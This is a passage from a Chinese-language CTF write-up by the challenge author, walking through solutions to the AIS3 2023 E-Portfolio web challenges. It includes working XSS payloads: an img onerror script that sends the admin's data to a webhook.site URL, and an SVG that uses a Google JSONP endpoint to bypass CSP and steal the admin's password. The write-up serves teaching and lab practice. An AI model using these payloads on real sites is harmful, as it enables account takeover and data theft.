+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">"/api/portfolio"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>)</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">"Unauthorized"</span> })</span><br><span class="line">    db.<span class="title function_">get</span>(<span class="string">"SELECT * FROM Users WHERE username = ?"</span>, req.<span class="property">session</span>.<span class="property">username</span>, <span class="function">(<span class="params">err, row</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">"Internal server error"</span> })</span><br><span class="line">        <span class="keyword">if</span> (!row)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">"Not found"</span> })</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">data</span>: row })</span><br><span class="line">    })</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div>
+
+<p>這裡我們使用下方的 code 設成我們的 portfolio 來觸發 XSS，注意因為這個 XSS 的點是 <code>innerHTML</code>，所以直接插入 <code>&lt;script&gt;</code> 是不會被執行的，這裡有說明為什麼不行 <a class="link" target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations%E3%80%82">https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>下面的 script 做的是就是把使用者的資料送到 webhook.site，儲存後按下 Share your portfolio with admin，admin 拜訪後他的資料就會被送來我們這邊，flag 就在裡面，結果在下面那張圖片裡。也有另一種送資料的方式：把資料設成自己的 portfolio。</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"</span></span></span><br><span class="line"><span class="string"><span class="tag">    fetch('/api/portfolio')</span></span></span><br><span class="line"><span class="string"><span class="tag">        .then(function (res) { return res.json() })</span></span></span><br><span class="line"><span class="string"><span class="tag">            .then(function (data) {</span></span></span><br><span class="line"><span class="string"><span class="tag">                location = `https://webhook.site/e4d998ee-e522-4327-a277-9fa10b77e43a?${JSON.stringify(data)}`</span></span></span><br><span class="line"><span class="string"><span class="tag">            });</span></span></span><br><span class="line"><span class="string"><span class="tag">"</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/ais3-pre-exam-2023-write-up/webhook.webp"></p>
+<p>另外看到有一些人選擇偷 cookie，但 <code>connect.sid</code> 是設成了 http only，所以 Javascript 在一般情況下是拿不到這個跟登入狀態有關的 cookie 的。</p>
+<p>另外在 MyFirstCTF 結束後我有上台分享大家都在 portfolio 裡面放了什麼，那份簡報在<a href="/ais3-pre-exam-2023-write-up/My%20First%20CTF%202023.pdf">這裡</a>。</p>
+<p>另外這題 admin 的使用者名稱不叫作 admin，所以會看到有人會把 admin 註冊起來然後放假的 flag，很多人中計。</p>
+<h4 id="E-portfolio"><a href="#E-portfolio" class="headerlink" title="E-portfolio"></a>E-portfolio</h4><p><a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/e-portfolio">題目 source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<ul>
+<li>解題人數<ul>
+<li>Pre-exam: 2 / 256 (score &gt;= 100)</li>
+</ul>
+</li>
+</ul>
+<p>其實原本沒有 E-Portfolio baby 這題，是 MyFirstCTF 題不夠才把 E-portfolio 簡化成新的一題。</p>
+<p>這題跟 E-Portfolio baby 的差別只有多了 <a class="link" target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 跟 <a class="link" target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify">DOMPurify <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的防護而已。</p>
+<p>前一題的<a target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/share.eta#L29-L30">所有 <code>innerHTML</code> 的地方</a> 都被加上了 <code>DOMPurify.sanitize</code>，所以這些地方就很難 XSS 了，不過我們還有可以上傳圖片的地方，可以試試 SVG XSS。</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"&lt;%= it.nonce %&gt;"</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">`/api/share<span class="subst">${location.search}</span>`</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (data.<span class="property">success</span>) {</span></span><br><span class="line"><span class="language-javascript">                username.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(data.<span class="property">data</span>.<span class="property">username</span>)</span></span><br><span class="line"><span class="language-javascript">                about.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(data.<span class="property">data</span>.<span class="property">about</span>)</span></span><br><span class="line"><span class="language-javascript">                avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span></span></span><br><span class="line"><span class="language-javascript">            } <span class="keyword">else</span> {</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(data.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">            }</span></span><br><span class="line"><span class="language-javascript">        })</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>使用者上傳圖片之後會被 host 到 <code>/avatars/&lt;MD5 hash&gt;.&lt;ext&gt;</code>，所以確實可以 SVG XSS。</p>
+<p>要 XSS 之前我們還需要 bypass <a class="link" target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。把<a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/app.js#L43-L63">網站設置的 CSP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 拿到 <a class="link" target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 看看有哪些地方可以用來 XSS，發現 <code>'script-src'</code> 有 <code>https://*.google.com</code> 可以利用。</p>
+<p><img src="/ais3-pre-exam-2023-write-up/csp-evaluator.png"></p>
+<p>可以使用下面這個 endpoint，把 XSS payload 放到 <code>?callback</code> 裡就能用了，那個網址的回應如下二所示，可看到我們的 <code>fetch('/api/portfolio');</code> 被放進回應裡，而且是個可正常執行的 Javascript。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://accounts.google.com/o/oauth2/revoke?callback=fetch(%27/api/portfolio%27);</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// API callback</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">'/api/portfolio'</span>);({</span><br><span class="line">  <span class="string">"error"</span>: {</span><br><span class="line">    <span class="string">"code"</span>: <span class="number">400</span>,</span><br><span class="line">    <span class="string">"message"</span>: <span class="string">"Invalid JSONP callback name: 'fetch('/api/portfolio');'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed."</span>,</span><br><span class="line">    <span class="string">"status"</span>: <span class="string">"INVALID_ARGUMENT"</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
+
+<p>所以解題步驟如下：</p>
+<ol>
+<li>把下面這個 SVG 設成自己的 avatar，他做的事情就是把使用者密碼存到自己的 portfolio 裡面。</li>
+</ol>
+<div class="highlight-container" data-rel="Svg"><figure class="iseeu highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">href</span>=<span class="string">"https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio')</span></span></span><br><span class="line"><span class="string"><span class="tag">                .then(function (res) { return res.json() })</span></span></span><br><span class="line"><span class="string"><span class="tag">                .then(function (data) {</span></span></span><br><span class="line"><span class="string"><span class="tag">                    if (data.success) {</span></span></span><br><span class="line"><span class="string"><span class="tag">                        const ADMIN_PASSWORD = data.data.password;</span></span></span><br><span class="line"><span class="string"><span class="tag">                        fetch('/api/login', {</span></span></span><br><span class="line"><span class="string"><span class="tag">                            method: 'POST',</span></span></span><br><span class="line"><span class="string"><span class="tag">                            headers: {</span></span></span><br><span class="line"><span class="string"><span class="tag">                                'Content-Type': 'application/json'</span></span></span><br><span class="line"><span class="string"><span class="tag">                            },</span></span></span><br><span class="line"><span class="string"><span class="tag">                            body: JSON.stringify({</span></span></span><br><span class="line"><span class="string"><span class="tag">                                username: 'c9dec36a35e1f8723cdcbbbad50123f3',</span></span></span><br><span class="line"><span class="string"><span class="tag">                                password: 'f7e2ca2336d33b6509656bb3581f0fa0' </span></span></span><br><span class="line"><span class="string"><span class="tag">                            })</span></span></span><br><span class="line"><span class="string"><span class="tag">                        })</span></span></span><br><span class="line"><span class="string"><span class="tag">                        .then(function (res) { </span></span></span><br><span class="line"><span class="string"><span class="tag">                            const formData = new FormData();</span></span></span><br><span class="line"><span class="string"><span class="tag">                            formData.append('about', ADMIN_PASSWORD);</span></span></span><br><span class="line"><span class="string"><span class="tag">                            fetch('/api/portfolio', {</span></span></span><br><span class="line"><span class="string"><span class="tag">                                method: 'PUT',</span></span></span><br><span class="line"><span class="string"><span class="tag">                                body: formData</span></span></span><br><span class="line"><span class="string"><span class="tag">                            })</span></span></span><br><span class="line"><span class="string"><span class="tag">                        })</span></span></span><br><span class="line"><span class="string"><span class="tag">                    } </span></span></span><br><span class="line"><span class="string"><span class="tag">                });"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<ol start="2">
+<li><p>把剛上傳好的 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 網址記下來，如果直接拜訪 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 可以確認 XSS 確實被觸發。</p>
+<p>所以要把 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 送給 admin，需要蓋過<a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/portfolio.eta#L86C9-L103">原本 Share your portfolio with admin 的網址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，其實只需把 <code>onReport</code> 蓋成送我們的 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 的網址，像下面這樣。（之所以是蓋 <code>onReport</code> 的原因是因為 reCAPTCHA 的<a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/portfolio.eta#L35-L36">配置 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>關係）。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onReport</span>(<span class="params">token</span>) {</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">`/avatars/8209116d30ade81ae5c2793d3d8ed4cf.svg`</span>, location)</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">'/api/report'</span>, {</span><br><span class="line">        <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="attr">headers</span>: {</span><br><span class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span></span><br><span class="line">        },</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">url</span>: url.<span class="property">href</span>, <span class="string">'g-recaptcha-response'</span>: token }),</span><br><span class="line">    })</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">success</span>)</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">'Request sent!'</span>)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="title function_">alert</span>(data.<span class="property">message</span>)</span><br><span class="line">            grecaptcha.<span class="title function_">reset</span>();</span><br><span class="line">        })</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+
+</li>
+<li><p>登入我們剛剛用來收資料的帳戶可以看到 portfolio 已經被設成 flag 了。</p>
+</li>
+</ol>
+<iframe frameBorder="0" style="overflow: visible; width: 100%; height: 35rem; " srcdoc="<html lang=&quot;en&quot;> <head> <title>Edit Portfolio</title> <script async=&quot;&quot; src=&quot;https://www.clarity.ms/tag/gsfl4ftdey&quot;></script> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <!-- Google tag (gtag.js) --> <script async=&quot;&quot; src=&quot;https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP&quot;></script> <script nonce=&quot;&quot;> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag(&quot;js&quot;, new Date()); gtag(&quot;config&quot;, &quot;G-2EDF3XCYWP&quot;); </script> <script type=&quot;text/javascript&quot; nonce=&quot;&quot;> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> </head> <body> <div class=&quot;container-sm mt-5&quot;> <h1 class=&quot;mb-3&quot;>Edit Portfolio</h1> <div class=&quot;row mb-5&quot;> <div class=&quot;col-sm-3&quot;> <h3 class=&quot;mb-3 mt-3&quot;>Photo</h3> <img src=&quot;/images/Ching367436.webp&quot; class=&quot;img-fluid&quot; id=&quot;avatar&quot; style=&quot;width: 15rem;&quot;> <div class=&quot;mt-3 mb-3&quot;> <label class=&quot;form-label&quot; for=&quot;avatarFile&quot;>Upload avatar</label> <input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatarFile&quot;> </div> </div> <div class=&quot;col-sm-9&quot;> <h3 class=&quot;mt-3&quot;>About <span id=&quot;username&quot;>c9dec36a35e1f8723cdcbbbad50123f3</span></h3> <textarea name=&quot;&quot; id=&quot;about&quot; class=&quot;form-control&quot; rows=&quot;10&quot;>AIS3{<script href=&quot;https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio');&quot;></script>}</textarea> </div> </div> <div class=&quot;container&quot;> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;save&quot;>Save</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;logout&quot;>Logout</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;share&quot;>Share</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;report&quot;>Share your portfolio with admin</button> </div> </div> </body> </html>"></iframe>
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> AIS3 Pre-exam 2023 Write-up</li>
+        <li><strong>Author:</strong> Ching367436</li>
+        <li><strong>Created at
+                :</strong> 2023-06-06 15:44:47</li>
+        
+        <li>
+            <strong>Link:</strong> https://blog.ching367436.me/ais3-pre-exam-2023-write-up/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/ais3/">#ais3</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦閱讀</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/ais3-eof-2024-write-up/" title="AIS3 EOF 2024 Write-up" rel="bookmark">
+  <img src="/ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp" alt="AIS3 EOF 2024 Write-up" class="!max-w-none">
+  <span class="title">AIS3 EOF 2024 Write-up</span>
+</a><a class="recommended-article-item" href="/osu-gaming-ctf-2024-write-up/" title="osu!gaming CTF 2024 Write-up" rel="bookmark">
+  <img src="/osu-gaming-ctf-2024-write-up/thailand-beach.webp" alt="osu!gaming CTF 2024 Write-up" class="!max-w-none">
+  <span class="title">osu!gaming CTF 2024 Write-up</span>
+</a><a class="recommended-article-item" href="/ais3-2022-最佳專題/" title="AIS3 2022 最佳專題" rel="bookmark">
+  <img src="/ais3-2022-最佳專題/ais3-flag.webp" alt="AIS3 2022 最佳專題" class="!max-w-none">
+  <span class="title">AIS3 2022 最佳專題</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦閱讀</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/ais3-eof-2024-write-up/" title="AIS3 EOF 2024 Write-up" rel="bookmark">
+  <img src="/ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp" alt="AIS3 EOF 2024 Write-up" class="!max-w-none">
+  <span class="title">AIS3 EOF 2024 Write-up</span>
+</a><a class="recommended-article-item" href="/osu-gaming-ctf-2024-write-up/" title="osu!gaming CTF 2024 Write-up" rel="bookmark">
+  <img src="/osu-gaming-ctf-2024-write-up/thailand-beach.webp" alt="osu!gaming CTF 2024 Write-up" class="!max-w-none">
+  <span class="title">osu!gaming CTF 2024 Write-up</span>
+</a></div>
+   </div>
+  </div>
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/ais3-2023-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">AIS3 2023 最佳專題</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">AIS3 2022 最佳專題</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'Ching367436/blog',
+                'data-repo-id': 'R_kgDOJNMXOw',
+                'data-category': 'Giscus',
+                'data-category-id': 'DIC_kwDOJNMXO84CVeVB',
+                'data-mapping': 'title',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'en',
+                'data-input-position': 'bottom',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">AIS3 Pre-exam 2023 Write-up</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E5%87%BA%E7%9A%84%E9%A1%8C%E7%9B%AE"><span class="nav-text">我出的題目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart" style="color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ching367436</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        9 posts in total
+                    </span>
+                    
+                        <span>
+                            20.5k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
